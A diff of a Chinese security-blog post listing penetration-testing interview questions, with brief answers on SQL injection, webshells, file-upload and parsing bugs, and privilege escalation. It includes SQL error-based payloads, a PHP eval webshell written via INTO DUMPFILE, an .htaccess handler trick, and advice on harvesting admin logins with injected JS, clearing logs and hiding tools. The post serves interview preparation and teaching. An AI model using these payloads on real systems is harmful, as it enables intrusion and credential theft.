@@ -6,22 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.squidward.xyz">
-  <title>Squidward的个人博客</title>
+  <title>渗透常见面试题.md | Squidward的个人博客</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-    
-    <!-- <meta name="keywords" content="">
-    <meta name="description" content="Web安全"> -->
-  
-  <meta name="description" content="Web安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Squidward的个人博客">
-<meta property="og:url" content="http://www.squidward.xyz/page/2/index.html">
+  <meta name="description" content="一. 常规面试题1.拿到一个待检测的站，你觉得应该先做什么？  收集信息  whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息另说… 2.mysql的网站注入，5.0以上和5.0以下有什么区别？  5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。   5.0以下是多用户单操作，5.0以上是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透常见面试题.md">
+<meta property="og:url" content="http://www.squidward.xyz/2021/05/10/%E6%B8%97%E9%80%8F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/index.html">
 <meta property="og:site_name" content="Squidward的个人博客">
-<meta property="og:description" content="Web安全">
+<meta property="og:description" content="一. 常规面试题1.拿到一个待检测的站，你觉得应该先做什么？  收集信息  whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息另说… 2.mysql的网站注入，5.0以上和5.0以下有什么区别？  5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。   5.0以下是多用户单操作，5.0以上是">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-10T11:53:18.000Z">
+<meta property="article:modified_time" content="2021-05-10T11:53:58.128Z">
 <meta property="article:author" content="Squidward">
+<meta property="article:tag" content="技术">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Squidward的个人博客" type="application/atom+xml">
@@ -195,399 +194,196 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-
-  
-    <article id="post-Dirsaerch中文使用手册" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-渗透常见面试题" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/11/16/Dirsaerch%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" target="_blank">Dirsaerch中文使用手册</a>
-  
+    <h1 class="article-title" itemprop="name">
+      渗透常见面试题.md
     </h1>
   
 
 
   
   
-<a href="/2020/11/16/Dirsaerch%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" class="archive-article-date">
-        <time datetime="2020-11-16T09:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-16</time>
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2021/05/10/%E6%B8%97%E9%80%8F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/" class="archive-article-date">
+        <time datetime="2021-05-10T11:53:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-10</time>
 </a>
 
   
   
     
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">4.2k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">15分</span>
+    </span>
+  </span>
+</div>
+
 
   
   </header>
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h3 id="dirsearch中文使用手册"><a href="#dirsearch中文使用手册" class="headerlink" title="dirsearch中文使用手册"></a>dirsearch中文使用手册</h3><p>dirsearch是一种高级的命令行工具，旨在对web服务器中的目录和文件进行暴力破解。</p>
-    
-    <a class="article-more-a" href="/2020/11/16/Dirsaerch%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/#more">more >></a>
-    
-    
+    <h3 id="一-常规面试题"><a href="#一-常规面试题" class="headerlink" title="一. 常规面试题"></a>一. 常规面试题</h3><h5 id="1-拿到一个待检测的站，你觉得应该先做什么？"><a href="#1-拿到一个待检测的站，你觉得应该先做什么？" class="headerlink" title="1.拿到一个待检测的站，你觉得应该先做什么？"></a>1.拿到一个待检测的站，你觉得应该先做什么？</h5><p>  收集信息<br>  whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息另说…</p>
+<h5 id="2-mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#2-mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="2.mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>2.mysql的网站注入，5.0以上和5.0以下有什么区别？</h5><p>  5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+<p>  5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
+<h5 id="3-在渗透过程中，收集目标站注册人邮箱对我们有什么价值？"><a href="#3-在渗透过程中，收集目标站注册人邮箱对我们有什么价值？" class="headerlink" title="3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？"></a>3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</h5><p>  丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。</p>
+<p>  用邮箱做关键词进行丢进搜索引擎。</p>
+<p>  利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。</p>
+<p>  社工找出社交账号，里面或许会找出管理员设置密码的习惯 。</p>
+<p>  利用已有信息生成专用字典。</p>
+<p>  观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。</p>
+<h5 id="4-判断出网站的CMS对渗透有什么意义？"><a href="#4-判断出网站的CMS对渗透有什么意义？" class="headerlink" title="4.判断出网站的CMS对渗透有什么意义？"></a>4.判断出网站的CMS对渗透有什么意义？</h5><p>  查找网上已曝光的程序漏洞。</p>
+<p>  如果开源，还能下载相对应的源码进行代码审计。</p>
+<h5 id="5-一个成熟并且相对安全的CMS，渗透时扫目录的意义？"><a href="#5-一个成熟并且相对安全的CMS，渗透时扫目录的意义？" class="headerlink" title="5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？"></a>5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</h5><p>  敏感文件、二级目录扫描</p>
+<p>  站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
+<h5 id="6-常见的网站服务器容器。"><a href="#6-常见的网站服务器容器。" class="headerlink" title="6.常见的网站服务器容器。"></a>6.常见的网站服务器容器。</h5><p>  IIS、Apache、nginx、Lighttpd、Tomcat</p>
+<h5 id="7-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"><a href="#7-mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？" class="headerlink" title="7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"></a>7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</h5><p>  root权限以及网站的绝对路径。</p>
+<h5 id="8-目前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#8-目前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="8.目前已知哪些版本的容器有解析漏洞，具体举例。"></a>8.目前已知哪些版本的容器有解析漏洞，具体举例。</h5><p>  IIS 6.0<br>  /xx.asp/xx.jpg “xx.asp”是文件夹名</p>
+<p>  IIS 7.0/7.5<br>  默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
+<p>  Nginx<br>  版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>  空字节代码 xxx.jpg.php</p>
+<p>  Apache<br>  上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
+<p>  lighttpd<br>  xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</p>
+<h5 id="9-如何手工快速判断目标站是windows还是linux服务器？"><a href="#9-如何手工快速判断目标站是windows还是linux服务器？" class="headerlink" title="9.如何手工快速判断目标站是windows还是linux服务器？"></a>9.如何手工快速判断目标站是windows还是linux服务器？</h5><p>  linux大小写敏感,windows大小写不敏感。</p>
+<h5 id="10-为何一个mysql数据库的站，只有一个80端口开放？"><a href="#10-为何一个mysql数据库的站，只有一个80端口开放？" class="headerlink" title="10.为何一个mysql数据库的站，只有一个80端口开放？"></a>10.为何一个mysql数据库的站，只有一个80端口开放？</h5><p>  更改了端口，没有扫描出来。</p>
+<p>  站库分离。</p>
+<p>  3306端口不对外开放</p>
+<h5 id="11-3389无法连接的几种情况。"><a href="#11-3389无法连接的几种情况。" class="headerlink" title="11.3389无法连接的几种情况。"></a>11.3389无法连接的几种情况。</h5><p>  没开放3389 端口</p>
+<p>  端口被修改</p>
+<p>  防护拦截</p>
+<p>  处于内网(需进行端口转发)</p>
+<h5 id="12-如何突破注入时字符被转义？"><a href="#12-如何突破注入时字符被转义？" class="headerlink" title="12.如何突破注入时字符被转义？"></a>12.如何突破注入时字符被转义？</h5><p>  宽字符注入</p>
+<p>  hex编码绕过</p>
+<h5 id="13-在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#13-在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="13.在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>13.在某后台新闻编辑界面看到编辑器，应该先做什么？</h5><p>  查看编辑器的名称版本,然后搜索公开的漏洞。</p>
+<h5 id="14-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？"><a href="#14-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？" class="headerlink" title="14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？"></a>14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</h5><p>  能做的事情很多，用隐藏网马来举例子：<br>  插入<br>  &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </FilesMatch><br>  .jpg文件会被解析成.php文件。</p>
+<p>  具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
+<h5 id="15-注入漏洞只能查账号密码？"><a href="#15-注入漏洞只能查账号密码？" class="headerlink" title="15.注入漏洞只能查账号密码？"></a>15.注入漏洞只能查账号密码？</h5><p>  只要权限广，拖库脱到老。</p>
+<h5 id="16-安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#16-安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="16.安全狗会追踪变量，从而发现出是一句话木马吗？"></a>16.安全狗会追踪变量，从而发现出是一句话木马吗？</h5><p>  是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
+<h5 id="17-access-扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。"><a href="#17-access-扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。" class="headerlink" title="17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。"></a>17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。</h5><p>  迅雷下载，直接改后缀为.mdb。</p>
+<h5 id="18-提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#18-提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="18.提权时选择可读写目录，为何尽量不用带空格的目录？"></a>18.提权时选择可读写目录，为何尽量不用带空格的目录？</h5><p>  因为exp执行多半需要空格界定参数</p>
+<h5 id="19-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"><a href="#19-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？" class="headerlink" title="19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"></a>19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</h5><p>  同数据库。</p>
+<h5 id="20-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？"><a href="#20-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？" class="headerlink" title="20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？"></a>20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</h5><p>  and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
+<h5 id="21-某个防注入系统，在注入时会提示："><a href="#21-某个防注入系统，在注入时会提示：" class="headerlink" title="21:某个防注入系统，在注入时会提示："></a>21:某个防注入系统，在注入时会提示：</h5><p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1<br>如何利用这个防注入系统拿shell？</p>
+<p>  在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a target="_blank" rel="noopener" href="http://ytxiao.lofter.com/post/40583a_ab36540%E3%80%82">http://ytxiao.lofter.com/post/40583a_ab36540。</a></p>
+<h5 id="22-上传大马后访问乱码时，有哪些解决办法？"><a href="#22-上传大马后访问乱码时，有哪些解决办法？" class="headerlink" title="22.上传大马后访问乱码时，有哪些解决办法？"></a>22.上传大马后访问乱码时，有哪些解决办法？</h5><p>  浏览器中改编码。</p>
+<h5 id="23-审查上传点的元素有什么意义？"><a href="#23-审查上传点的元素有什么意义？" class="headerlink" title="23.审查上传点的元素有什么意义？"></a>23.审查上传点的元素有什么意义？</h5><p>  有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<h5 id="24-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#24-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h5><p>  先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
+<p>  其实有些站点，在登陆处也会这样提示</p>
+<p>  所有和数据库有交互的地方都有可能有注入。</p>
+<h5 id="25-目标站发现某txt的下载地址为http-www-test-com-down-down-php-file-upwdown-1-txt，你有什么思路？"><a href="#25-目标站发现某txt的下载地址为http-www-test-com-down-down-php-file-upwdown-1-txt，你有什么思路？" class="headerlink" title="25.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？"></a>25.目标站发现某txt的下载地址为<a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></h5><p>  这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
+<h5 id="26-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"><a href="#26-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？" class="headerlink" title="26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"></a>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</h5><p>  直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
+<h5 id="27-在有shell的情况下，如何使用xss实现对目标站的长久控制？"><a href="#27-在有shell的情况下，如何使用xss实现对目标站的长久控制？" class="headerlink" title="27.在有shell的情况下，如何使用xss实现对目标站的长久控制？"></a>27.在有shell的情况下，如何使用xss实现对目标站的长久控制？</h5><p>  后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
+<p>  在登录后才可以访问的文件中插入XSS脚本。</p>
+<h5 id="28-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？"><a href="#28-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？" class="headerlink" title="28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？"></a>28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</h5><p>  审查元素 把密码处的password属性改成text就明文显示了</p>
+<h5 id="29-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？"><a href="#29-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？" class="headerlink" title="29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？"></a>29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</h5><p>  原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
+<h5 id="30-审查元素得知网站所使用的防护软件，你觉得怎样做到的？"><a href="#30-审查元素得知网站所使用的防护软件，你觉得怎样做到的？" class="headerlink" title="30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？"></a>30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</h5><p>  在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</p>
+<h5 id="31-在win2003服务器中建立一个-zhongzi文件夹用意何为？"><a href="#31-在win2003服务器中建立一个-zhongzi文件夹用意何为？" class="headerlink" title="31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？"></a>31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</h5><p>  隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
+<h5 id="32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："><a href="#32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：" class="headerlink" title="32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："></a>32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</h5><p>A. demo.jsp?id=2+1    B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
+<h5 id="33、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？"><a href="#33、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？" class="headerlink" title="33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？"></a>33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</h5><p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
+<h5 id="34、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？"><a href="#34、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？" class="headerlink" title="34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？"></a>34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</h5><p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<h5 id="35、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#35、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h5><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
+<p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
+<h5 id="36、CSRF、SSRF和重放攻击有什么区别？"><a href="#36、CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="36、CSRF、SSRF和重放攻击有什么区别？"></a>36、CSRF、SSRF和重放攻击有什么区别？</h5><p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
+<h5 id="37、说出至少三种业务逻辑漏洞，以及修复方式？"><a href="#37、说出至少三种业务逻辑漏洞，以及修复方式？" class="headerlink" title="37、说出至少三种业务逻辑漏洞，以及修复方式？"></a>37、说出至少三种业务逻辑漏洞，以及修复方式？</h5><p>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码<br>身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份<br>验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
+<h5 id="38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"></a>38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</h5><p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>*</em></strong>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,<em>/</em>;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://*<strong>**</strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p>
+<h5 id="39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？"><a href="#39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？" class="headerlink" title="39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？"></a>39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？</h5><p>40、你常用的渗透工具有哪些，最常用的是哪个？</p>
+<p>41、描述一个你深入研究过的 CVE 或 POC。</p>
+<p>42、谈谈你经常关注的安全平台？</p>
+<h3 id="二-私人面试总结内容"><a href="#二-私人面试总结内容" class="headerlink" title="二. 私人面试总结内容"></a>二. 私人面试总结内容</h3><p>做一下简单的自我介绍，经历，工作经验，爱好，自己总结</p>
+<p><strong>面试题</strong>：</p>
+<h5 id="一，给你一个网站你是如何来渗透测试的"><a href="#一，给你一个网站你是如何来渗透测试的" class="headerlink" title="一，给你一个网站你是如何来渗透测试的?"></a>一，给你一个网站你是如何来渗透测试的?</h5><p>  在获取书面授权的前提下。<br>  1)信息收集，<br>    1，获取域名的whois信息,获取注册者邮箱姓名电话等。<br>    2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>    3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>    4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>    5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>    6，google hack 进一步探测网站的信息，后台，敏感文件<br>  2）漏洞扫描<br>    开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>    远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等<br>  3）漏洞利用<br>    利用以上的方式拿到webshell，或者其他权限<br>  4）权限提升<br>    提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，<br>      linux藏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权<br>  5) 日志清理<br>  6）总结报告及修复方案<br>一，sqlmap，怎么对一个注入点注入？<br>  1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>  2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>  3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用*号替换，放到文件里，然后sqlmap -r “文件地址”</p>
+<h5 id="二，nmap，扫描的几种方式"><a href="#二，nmap，扫描的几种方式" class="headerlink" title="二，nmap，扫描的几种方式"></a>二，nmap，扫描的几种方式</h5><h5 id="三，sql注入的几种类型？"><a href="#三，sql注入的几种类型？" class="headerlink" title="三，sql注入的几种类型？"></a>三，sql注入的几种类型？</h5><p>  1）报错注入<br>  2）bool型注入<br>  3）延时注入<br>  4）宽字节注入</p>
+<h5 id="四，报错注入的函数有哪些？10个"><a href="#四，报错注入的函数有哪些？10个" class="headerlink" title="四，报错注入的函数有哪些？10个"></a>四，报错注入的函数有哪些？10个</h5><p>  1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————-<br>  2）通过floor报错 向下取整<br>  3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>  4）.geometrycollection()select* from test where id=1 and geometrycollection((select <em>from(select</em> from(select user())a)b));<br>  5）.multipoint()select <em>from test where id=1 and multipoint((select</em> from(select <em>from(select user())a)b));<br>  6）.polygon()select</em> from test where id=1 and polygon((select <em>from(select</em> from(select user())a)b));<br>  7）.multipolygon()select <em>from test where id=1 and multipolygon((select</em> from(select <em>from(select user())a)b));<br>  8）.linestring()select</em> from test where id=1 and linestring((select <em>from(select</em> from(select user())a)b));<br>  9）.multilinestring()select <em>from test where id=1 and multilinestring((select</em> from(select <em>from(select user())a)b));<br>  10）.exp()select</em> from test where id=1 and exp(~(select * from(select user())a));</p>
+<h5 id="五，延时注入如何来判断？"><a href="#五，延时注入如何来判断？" class="headerlink" title="五，延时注入如何来判断？"></a>五，延时注入如何来判断？</h5><p>  if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
+<h5 id="六，盲注和延时注入的共同点？"><a href="#六，盲注和延时注入的共同点？" class="headerlink" title="六，盲注和延时注入的共同点？"></a>六，盲注和延时注入的共同点？</h5><p>  都是一个字符一个字符的判断</p>
+<h5 id="七，如何拿一个网站的webshell？"><a href="#七，如何拿一个网站的webshell？" class="headerlink" title="七，如何拿一个网站的webshell？"></a>七，如何拿一个网站的webshell？</h5><p>  上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>  一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
+<h5 id="八，sql注入写文件都有哪些函数？"><a href="#八，sql注入写文件都有哪些函数？" class="headerlink" title="八，sql注入写文件都有哪些函数？"></a>八，sql注入写文件都有哪些函数？</h5><p>  select ‘一句话’ into outfile ‘路径’<br>  select ‘一句话’ into dumpfile ‘路径’<br>  select ‘<?php eval($_POST[1]) ?>‘ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
+<h5 id="九，如何防止CSRF"><a href="#九，如何防止CSRF" class="headerlink" title="九，如何防止CSRF?"></a>九，如何防止CSRF?</h5><p>  1,验证referer<br>  2，验证token<br>  详细：<a target="_blank" rel="noopener" href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
+<h5 id="十，owasp-漏洞都有哪些？"><a href="#十，owasp-漏洞都有哪些？" class="headerlink" title="十，owasp 漏洞都有哪些？"></a>十，owasp 漏洞都有哪些？</h5><p>  1、SQL注入防护方法：<br>  2、失效的身份认证和会话管理<br>  3、跨站脚本攻击XSS<br>  4、直接引用不安全的对象<br>  5、安全配置错误<br>  6、敏感信息泄露<br>  7、缺少功能级的访问控制<br>  8、跨站请求伪造CSRF<br>  9、使用含有已知漏洞的组件<br>  10、未验证的重定向和转发</p>
